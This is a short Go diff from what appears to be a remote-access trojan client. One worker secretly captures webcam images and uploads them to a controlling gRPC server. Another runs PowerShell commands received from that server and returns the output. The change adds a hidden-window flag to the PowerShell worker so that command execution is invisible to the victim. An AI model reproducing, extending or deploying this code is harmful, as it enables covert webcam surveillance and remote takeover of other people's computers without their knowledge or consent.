@@ -166,7 +166,7 @@ func webcampic_worker(client pb.ConsumerClient, ctx context.Context, pid string)
 	if d.GetShouldTakePicture() {
 		img := webcam.CaptureWebcam()
 		client.SetPictureOutput(ctx, &pb.PictureOutput{Id: &pb.ClientDataRequest{ClientId: pid}, PictureData: img}, grpc.MaxCallRecvMsgSize(6000000*1024),
-			grpc.MaxCallSendMsgSize(6000000*1024))
+			grpc.MaxCallSendMsgSize(6000000*48))
 	}
 
 	return nil
@@ -222,13 +222,14 @@ func exec_worker(client pb.ConsumerClient, ctx context.Context, pid string) erro
 		log.Println("Error during GetCommand:", err)
 	}
 
-	var out []byte
 	if d.GetShouldExec() {
-		out, err = exec.Command("powershell.exe", "-c", d.Command).CombinedOutput()
-		client.SetCommandOutput(ctx, &pb.ClientExecOutput{Id: &pb.ClientDataRequest{ClientId: pid}, Output: out})
+		cmd := exec.Command("powershell.exe", "-c", d.Command)
+		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+		out, err := cmd.CombinedOutput()
 		if err != nil {
 			return fmt.Errorf("error during exec: %v", err)
 		}
+		client.SetCommandOutput(ctx, &pb.ClientExecOutput{Id: &pb.ClientDataRequest{ClientId: pid}, Output: out})
 	}
 
 	return nil
